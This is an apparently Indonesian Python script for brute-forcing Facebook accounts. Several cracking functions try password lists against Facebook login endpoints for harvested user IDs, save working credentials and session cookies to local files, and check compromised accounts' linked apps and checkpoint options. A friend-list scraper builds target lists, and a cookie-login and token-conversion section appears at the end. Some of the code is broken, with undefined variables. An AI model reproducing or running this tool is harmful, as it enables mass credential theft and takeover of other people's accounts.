				print('\r%s╚══ COOKIE : %s       '%(H,coki))
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+coki+'\n')
				ok+=1
				cek_apk(coki)
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
	
def crack5(idf,pwv,**data):
	global loop,ok,cp
	bi = random.choice([u,k,kk,b,h,hh])
	pers = loop*100/len(id2)
	fff = '%'
	for wk in list('\|-/'):
		print(f'\r%s{wk} %s/%s OK/%s CP/%s <•> %s%s%s    '%(bi,len(id2),loop,ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
	ses = requests.Session()
	for pw in pwv:
		try:
			tix = time.time()
			ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F').text
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":idf,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
			ses.headers.update({"Host":'m.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
				else:
					print('\r%s╚══ %s|%s       '%(K,idf,pw))
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				break
			elif 'c_user' in ses.cookies.get_dict().keys(): 
				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")
				print('\r%s╚══ %s|%s       '%(H,idf,pw))
				print('\r%s╚══ COOKIE : %s       '%(H,coki))
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+coki+'\n')
				ok+=1
				cek_apk(coki)
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
	
def api(idf,pwv):
	global loop,ok,cp
	bi = random.choice([u,k,kk,b,h,hh])
	pers = loop*100/len(id2)
	fff = '%'
	for wk in list('\|-/'):
		print(f'\r%s{wk} %s/%s OK/%s CP/%s <•> %s%s%s'%(bi,len(id2),loop,ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
	ses = requests.Session()
	for pw in pwv:
		try:
			pw = pw.lower()
			p = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+idf+"&locale=en_US&password="+pw+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6").json()
			if "www.facebook.com" in p:
				if 'ya' in oprek:
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
				else:
					print('\r%s╰── %s|%s       '%(K,idf,pw))
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				break
			elif "access_token" in p:
				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")
				print('\r%s╰── %s|%s       '%(H,idf,pw))
				print('\r%s╰── COOKIE : %s       '%(H,coki))
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+coki+'\n')
				ok+=1
				cek_apk(coki)
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
	
def crack3(idf,pwv,**data):
	global loop,ok,cp
	bi = random.choice([u,k,kk,b,h,hh])
	pers = loop*100/len(id2)
	fff = '%'
	for wk in list('\|-/'):
		print(f'\r%s{wk} {N}%s/%s OK/%s CP/%s <•> %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
	ses = requests.Session()
	for pw in pwv:
		try:
			r = ses.get("https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F", headers=header_get())
			das={"lsd":re.search('name="lsd" value="(.*?)"', str(r.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(r.text)).group(1),"uid":idf,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
			ses.post("https://m.facebook.com/login/device-based/validate-password/?shbl=0", data = das, headers = header_post(), allow_redirects = False)
			cok=ses.cookies.get_dict()
			if "checkpoint" in cok:
				if 'ya' in oprek:
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
				else:
					print('\r%s╚══ %s|%s       '%(K,idf,pw))
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				break
			elif "c_user" in cok:
				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")
				print('\r%s╚══ %s|%s       '%(H,idf,pw))
				print('\r%s╚══ COOKIE : %s       '%(H,coki))
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+coki+'\n')
				ok+=1
				cek_apk(coki)
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
	
def crack(idf,pwv,**data):
	global loop,ok,cp
	bi = random.choice([u,k,kk,b,h,hh])
	pers = loop*100/len(id2)
	fff = '%'
	for wk in list('\|-/'):
		print(f'\r%s{wk} {N}%s/%s OK/%s CP/%s <•> %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
	ses = requests.Session()
	for pw in pwv:
		try:
			r = ses.get("https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F", headers=header_mbasic())
			das={"lsd":re.search('name="lsd" value="(.*?)"', str(r.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(r.text)).group(1),"uid":idf,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
			ses.post("https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0", data = das, headers = header_post_mbasic(), allow_redirects = False)
			cok=ses.cookies.get_dict()
			if "checkpoint" in cok:
				if 'ya' in oprek:
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
				else:
					print('\r%s╚══ %s|%s       '%(K,idf,pw))
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				break
			elif "c_user" in cok:
				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")
				print('\r%s╚══ %s|%s       '%(H,idf,pw))
				print('\r%s╚══ COOKIE : %s       '%(H,coki))
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+coki+'\n')
				ok+=1
				cek_apk(coki)
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
	
def crack4(idf,pwv,**data):
	global loop,ok,cp
	bi = random.choice([u,k,kk,b,h,hh])
	pers = loop*100/len(id2)
	fff = '%'
	for wk in list('\|-/'):
		print(f'\r%s{wk} %s/%s OK/%s CP/%s <•> %s%s%s'%(bi,len(id2),loop,ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
	ua = random.choice(ugen)
	ua = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			tix = time.time()
			ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F').text
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":idf,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
			ses.headers.update({"Host":'m.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
				else:
					print('\r%s╰── %s|%s       '%(K,idf,pw))
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")
				print('\r%s╰── %s|%s       '%(H,idf,pw))
				print('\r%s╰── COOKIE : %s       '%(H,coki))
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+coki+'')
				ok+=1
				cek_apk(coki) 
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
	

def cek_apk(coki):
	session = requests.Session()
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+coki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	print("\r╚══ INFORMASI GAME : ") 
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print("\r       ╚══ %s%s. %s%s"%(P,i+1,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
	except AttributeError:
		print ("\r      %s• cookie invalid"%(M))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+coki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print("\r       ╚══ %s%s. %s%s"%(P,i+1,K,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
	except AttributeError:
		print ("\r      %s• token invalid"%(M))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=removed",cookies={"cookie":"noscript=1;"+coki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print("\r       ╚══ %s%s. %s%s"%(P,i+1,M,game[i].replace("Dihapus"," Dihapus")))
	except AttributeError:
		print ("\r      %s• token invalid"%(M))
def ff(coki):
	ses = requests.Session()
	ua = 'Mozilla/5.0 (Linux; Android 8.1.0; S45B Build/OPM2.171019.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.45 Mobile Safari/537.36'
	header = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://m.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://m.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
	url_aktif = 'https://mbasic.facebook.com/settings/apps/tabbed/?tab=active'
	url_exp = 'https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive'
	url_delete = 'https://mbasic.facebook.com/settings/apps/tabbed/?tab=removed'
	k = sop(ses.get('https://mbasic.facebook.com', cookies={"cookie":"noscript=1;"+coki}, headers=header).text,'html.parser')
	ji = k.find_all('a')
	ff = []
	for v in ji:
		if v.text=='Tidak, Terima Kasih':
			ff.append('https://mbasic.facebook.com'+v['href'])
	if len(ff)==1:
		cb = sop(ses.get(ff[0], cookies={"cookie":"noscript=1;"+coki}, headers=header).text,'html.parser')
		yz = cb.find('form')['action']
		dt = {}
		for u in cb('input'):
			if u.get('name') in ['jazoest','fb_dtsg']:
				dt.update({u.get('name'):u.get('value')})
		fy = sop(ses.post('https://mbasic.facebook.com'+yz, data=dt, cookies={'cookie':coki}, headers=header).text,'html.parser')
		kof = sop(ses.get(url_aktif, cookies={"cookie":"noscript=1;"+coki}, headers=header).text,'html.parser')
		cb = sop(ses.get(url_exp, cookies={"cookie":"noscript=1;"+coki}, headers=header).text,'html.parser')
		hap = sop(ses.get(url_delete, cookies={"cookie":"noscript=1;"+coki}, headers=header).text,'html.parser')
	if kof.find('a').text=='Coba Lagi':
		exit('yah sesi new bro :v')
	if kof.find('title').text=='Masuk Facebook | Facebook':
		exit('cookiesnya mati bro')
		print('* Informasi Aplikasi Terhubung')
		aktif = kof.find_all('span','_1yyi _9dut')
		aktif2 = kof.find_all('p','_90gc mfss fcg')
		print(f'* Terdapat {len(aktif)} Apk Aktif')
		aktf,aktf2 = [],[]
	for akf in aktif:
		aktf.append(akf.text)
	for cc in aktif2:
		aktf2.append(cc.text)
	u = -1
	for yv in range(len(aktf)):
		u+=1
		kui('[bright_green]  '+str(aktf[int(u)])+'[/bright_green][bright_cyan] '+str(aktf2[int(u)])+'[/bright_cyan]')
	expired = cb.find_all('span','_1yyi _9dut')
	expired2 = cb.find_all('p','_90gc mfss fcg')
	print(f'* Terdapat {len(expired)} Apk Kadaluarsa')
	expr,expr2 = [],[]
	for ex in expired:
		expr.append(ex.text)
	for xx in expired2:
		expr2.append(xx.text)
	o = -1
	for ut in range(len(expr)):
		o+=1
		kui('[bright_yellow]  '+str(expr[int(o)])+'[/bright_yellow][bright_cyan] '+str(expr2[int(o)])+'[/bright_cyan]')
	dell = hap.find_all('span','_1yyi _2lsy')
	dell2 = hap.find_all('p','mfss fcg')
	print(f'* Terdapat {len(dell)} Apk Dihapus')
	hapuz,hapuz2 = [],[]
	for dlt in dell:
		hapuz.append(dlt.text)
	for xi in dell2:
		hapuz2.append(xi.text)
	w = -1
	for buriq in range(len(hapuz)):
		w+=1
		kui('[bright_red]  '+str(hapuz[int(w)])+'[/bright_red][bright_cyan] '+str(hapuz2[int(w)])+'[/bright_cyan]')
		

# OPSI
def ceker(idf,pw):
	global cp
	ua = 'Mozilla/5.0 (Linux; Android 8.1.0; S45B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36'
	head = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
	ses = requests.Session()
	try:
		hi = ses.get('https://mbasic.facebook.com')
		ho = sop(ses.post('https://mbasic.facebook.com/login.php', data={'email':idf,'pass':pw,'login':'submit'}, headers=head, allow_redirects=True).text,'html.parser')
		jo = ho.find('form')
		data = {}
		lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
		for anj in jo('input'):
			if anj.get('name') in lion:
				data.update({anj.get('name'):anj.get('value')})
		kent = sop(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=head).text,'html.parser')
		print('\r%s••> %s|%s ----> CP       %s'%(b,idf,pw,x))
		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
		cp+=1
		opsi = kent.find_all('option')
		if len(opsi)==0:
			print('\r%s---> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(hh,x))
			cek_apk(coki)
		else:
			for opsii in opsi:
				print('\r%s---> %s%s'%(kk,opsii.text,x))
	except Exception as c:
		print('\r%s••> %s|%s ----> CP       %s'%(b,idf,pw,x))
		print('\r%s---> Tidak Dapat Mengecek Opsi (Cek Login Di Lite/Mbasic)%s'%(u,x))
		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
		cp+=1

# OPSI CEKER
def cek_opsi():
	c = len(akun)
	hu = 'Terdapat %s Akun Untuk Dicek\nSebelum Mulai, Mode Pesawat/Ubah Kartu Sim Terlebih Dahulu'%(c)
	cetak(nel(hu, title='CEK OPSI'))
	input(x+'['+h+'•'+x+'] Mulai')
	cek = '# PROSES CEK OPSI DIMULAI'
	sol().print(mark(cek, style='green'))
	love = 0
	for kes in akun:
		try:
			try:
				id,pw = kes.split('|')[0],kes.split('|')[1]
			except IndexError:
				time.sleep(2)
				print('\r%s••> %s ----> Error      %s'%(b,kes,x))
				print('\r%s---> Pemisah Tidak Didukung Untuk Program Ini%s'%(u,x))
				continue
			bi = random.choice([u,k,kk,b,h,hh])
			print('\r%s---> %s/%s ---> { %s }%s'%(bi,love,len(akun),id,x), end=' ');sys.stdout.flush()
			ua = 'Mozilla/5.0 (Linux; Android 8.1.0; S45B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36'
			ses = requests.Session()
			header = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			hi = ses.get('https://mbasic.facebook.com')
			ho = sop(ses.post('https://mbasic.facebook.com/login.php', data={'email':id,'pass':pw,'login':'submit'}, headers=header, allow_redirects=True).text,'html.parser')
			if "checkpoint" in ses.cookies.get_dict().keys():
				try:
					jo = ho.find('form')
					data = {}
					lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
					for anj in jo('input'):
						if anj.get('name') in lion:
							data.update({anj.get('name'):anj.get('value')})
					kent = sop(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=header).text,'html.parser')
					print('\r%s••> %s|%s ----> CP       %s'%(b,id,pw,x))
					opsi = kent.find_all('option')
					if len(opsi)==0:
						print('\r%s---> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(hh,x))
						cek_apk(coki)
					else:
						for opsii in opsi:
							print('\r%s---> %s%s'%(kk,opsii.text,x))
				except:
					print('\r%s••> %s|%s ----> CP       %s'%(b,id,pw,x))
					print('\r%s---> Tidak Dapat Mengecek Opsi%s'%(u,x))
			elif "c_user" in ses.cookies.get_dict().keys():
				print('\r%s••> %s|%s|%s ----> OK       %s'%(h,id,pw,coki,x))
				cek_apk(coki)
			else:
				print('\r%s••> %s|%s ----> SALAH       %s'%(x,id,pw,x))
			love+=1
		except requests.exceptions.ConnectionError:
			print('')
			li = '# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGI'
			sol().print(mark(li, style='red'))
			exit()
	dah = '# DONE'
	sol().print(mark(dah, style='green'))
	exit()
	
def ambilid():
	it = input("[?] ID Public : ");time.sleep(0.04)
	try:
		toket = open("token.txt","r").read()
		otw = requests.get('https://graph.facebook.com/%s?access_token=%s'%(it,toket))
		a = json.loads(otw.text)
		print('[•] nama : %s' % a['name'])
	except KeyError:
		jalan("[❌] Id Tidak Ada")
		ambilid()
	except IOError:
		jalan("[❌] Id Tidak Ada")
		ambilid()
	tampung=[]
	teman=[]
	lim = input("[•] Jumlah ID : ")
	ada = requests.get(f'https://graph.facebook.com/{it}?fields=name,friends.fields(id,name).limit{lim}&access_token={toket}').json()
	for x in ada['friends']['data']:
		tampung.append(x['id'])
	for id in tampung:
		try:
			ada2 = requests.get(f'https://graph.facebook.com/{it}?fields=name,friends.fields(id,name)&access_token={toket}').json()
			try:
				for b in idi2['friends']['data']:
					teman.append(b['id'])
			except KeyError:
				print("[•] Private")
			print("[•]", id,"•",len(teman))
			teman.clear()
		except KeyError:
			print("[•] Akun Terkena Spam")
			exit()
			
########################menu brute2####################################
# coding=utf-8
# coding by Romi Afrizal
# Izin dlu lah bro kalau mau recode, gk ngotak njir _-
# Note : jangan di ubah lagi! nanti error, script udah enak

import os, sys, subprocess, platform
try:
	import rich
except ImportError:
	print ('\n\t\x1b[0m >_< mohon tunggu... >_<\n')
	os.system('pip install rich')
	
import rich
from rich.markdown import Markdown
from rich.console import Console

try:
	import requests
except ImportError:
	catet_req = ('# • sedang menginstall modul requests •')
	requ = rich.markdown.Markdown(catet_req, style='green')
	rich.console.Console().print(requ)
	os.system('pip install requests')
try:
	import concurrent.futures
except ImportError:
	catet_futur = ('# • sedang menginstall modul futures •')
	ft = rich.markdown.Markdown(catet_futur, style='green')
	rich.console.Console().print(ft)
	os.system('pip install futures')
try:
	import bs4
except ImportError:
	catet_bs = ('# • sedang menginstall modul bs4 •')
	soup = rich.markdown.Markdown(catet_bs, style='green')
	rich.console.Console().print(soup)
	os.system('pip install bs4')
try:
	import mechanize
except ImportError:
	catet_mek = ('# • sedang menginstall modul mechanize •')
	meka = rich.markdown.Markdown(catet_mek, style='green')
	rich.console.Console().print(meka)
	os.system('pip install mechanize')
try:
	import stdiomask
except ImportError:
	catet_mask = ('# • sedang menginstall modul stdiomask •')
	mask = rich.markdown.Markdown(catet_mask, style='green')
	rich.console.Console().print(mask)
	os.system('pip install stdiomask')
	

Mr = '\x1b[1;91m' 
Hj = '\x1b[1;92m' 
Mt = '\x1b[0m'
# MODULE
import requests, shutil, os, re, bs4, sys, json, time, platform ,random, datetime, subprocess, logging, base64
import hmac, hashlib, urllib, stdiomask, urllib.request, uuid
from concurrent.futures import ThreadPoolExecutor
from rich.table import Table as me
from concurrent.futures import ThreadPoolExecutor as tred
from bs4 import BeautifulSoup as parser
from threading import (Thread, Event)
from rich.panel import Panel as nel
from rich.console import Console as sol
from rich.markdown import Markdown as mark
from rich import print as cetak
from time import sleep as jeda
from datetime import datetime

# TANGGAL BULAN 
ct = datetime.now()
n = ct.month
bulan_ = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
try:
	if n < 0 or n > 12:
		exit()
	nTemp = n - 1
except ValueError:
	exit()

current = datetime.now()
hari = current.day
bulan = bulan_[nTemp]
tahun = current.year
bullan = current.month

waktu = ("%s-%s-%s"%(hari,bulan,tahun))
bulan12 = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}

# KUMPULAN WARNA
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
h = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
J = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
m = '\x1b[1;91m' # HIJAU +
l = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
P = '\x1b[1;97m' # PUTIH
B = '\033[38;2;255;127;0;1m' # ORANGE
N = '\x1b[0m' # WARNA MATI
acak = [M, H, K, B, U, O, P, J]
warna = random.choice(acak)
Lu = "DICKY"
Hi = "&"
Wibu = "RIFKY"
til ="[×]"

id2 = []
ok, cp, id, user, pwx, loop = [], [], [], [], [], 0
old_gak = []
balmond ="[×]"

sys.stdout.write('\x1b[1;35m\x1b]2; ☆ MHD DICKY ☆ \x07')

# JALAN
def jalan(keliling):
	for mau in keliling + '\n':
		sys.stdout.write(mau)
		sys.stdout.flush();jeda(0.03)

# FOLDER
def folder():
	try:os.mkdir('IG')
	except:pass
try:
	os.mkdir('OK')
except:
	pass
try:
	os.mkdir('CP')
except:
	pass
	try:os.mkdir('data')
	except:pass

# LOGO (LO GOBLOK)
dt = requests.get("http://ip-api.com/json/").json()
try:
	IP = dt["query"]
	CN = dt["country"]
except KeyError:
	IP = " "
	CN = " "

author = 'CAPERBAND EIGHISTA'
fb_me = 'facebook.com/romi.afrizal.102'
github = 'github.com/Mark-Zuck'

def banner():
	os.system("clear")
	krek = """▄▄▄▄    ██▀███    █    ██ ▄▄▄█████▓▓█████   © Authour : DICKY        ▓█████▄ ▓██ ▒ ██▒ ██  ▓██▒▓  ██▒ ▓▒▓█   ▀       Versi 2.0                ▒██▒ ▄██▓██ ░▄█ ▒▓██  ▒██░▒ ▓██░ ▒░▒███                                ▒██░█▀  ▒██▀▀█▄  ▓▓█  ░██░░ ▓██▓ ░ ▒▓█  ▄                                ░▓█  ▀█▓░██▓ ▒██▒▒▒█████▓   ▒██▒ ░ ░▒████▒   Github : Dicky-XD            ░▒▓███▀▒░ ▒▓ ░▒▓░░▒▓▒ ▒ ▒   ▒ ░░   ░░ ▒░ ░                                 ▒░▒   ░   ░▒ ░ ▒░░░▒░ ░ ░     ░     ░ ░  ░                                   ░    ░   ░░   ░  ░░░ ░ ░   ░         ░                                   ░         ░        ░                 ░  ░"""
	cetak(nel(krek, style='purple'))
# CONVERT COOKIE DICT TO STRING
def romz_xyz(cookie,venom={}):
	for x in cookie.replace(' ','').strip().split(';'):
		kuki = x.split('=')
		if len(kuki) > 1:
			venom.update({kuki[0]: kuki[1]})
	return venom

# MENU MASUK
def Masuk():
	try:
		kueh = romz_xyz(open("data/cookies","r").read().strip())
	except FileNotFoundError:
		os.system('clear')
		banner()
		print ('%s*%s Tools ini Menggunakan Login Cookie Facebook.\n%s*%s Silahkan %sLogin Cookie%s Untuk Masuk Ke Menu.'%(O,N,O,N,H,N))
		kukis = input("%s?%s Cookie %s : %s"%(O,J,P,H))
		if kukis in(""):
			print ("%s%s isi cookie kentod "%(M,til))
			exit()
		else:
			konverter(kukis)
			masuk(kukis).login()
	pilihan().menu()
	
# MASUK LEWAT COOKIE (KUEH)
class masuk:
	
	def __init__(self,cok):
		self.cok = cok
		self.url = "https://mbasic.facebook.com"
		
	def login(self):
		try:
			cek = requests.get(f"{self.url}/profile.php?v=info", cookies=romz_xyz(self.cok)).text
			if "mbasic_logout_button" in cek:
				from data import login, informasi
				open("data/cookies","w").write(self.cok)
				if "Laporkan Masalah" in cek:
					mikey = login.bot(romz_xyz(self.cok),self.url)
					informasi.info(romz_xyz(self.cok),cek).myinfo()
					mikey.usernem()
					print ("\n%s √ login berhasil "%(H));jeda(2)
					pilihan().menu()
				else:
					mikey = login.bot(romz_xyz(self.cok),self.url)
					mikey.lang(romz_xyz(self.cok))
					informasi.info(romz_xyz(self.cok),cek).myinfo()
					print ("\n%s √ login berhasil "%(H));jeda(2)
					pilihan().menu()
			elif 'checkpoint' in cek:
				exit ("%s× login checkpoint "%(M));jeda(2)
			else:
				exit ("%s× cookie invalid "%(M));jeda(2)
		except requests.exceptions.ConnectionError:
			exit ("%s%s tidak ada koneksi "%(M,til));jeda(2)
			
# CONVERT COOKIE KE TOKEN 
def konverter(kukis): 
	_header = {
		'Host':'business.facebook.com',
		'cache-control':'max-age=0',
		'upgrade-insecure-requests':'1',
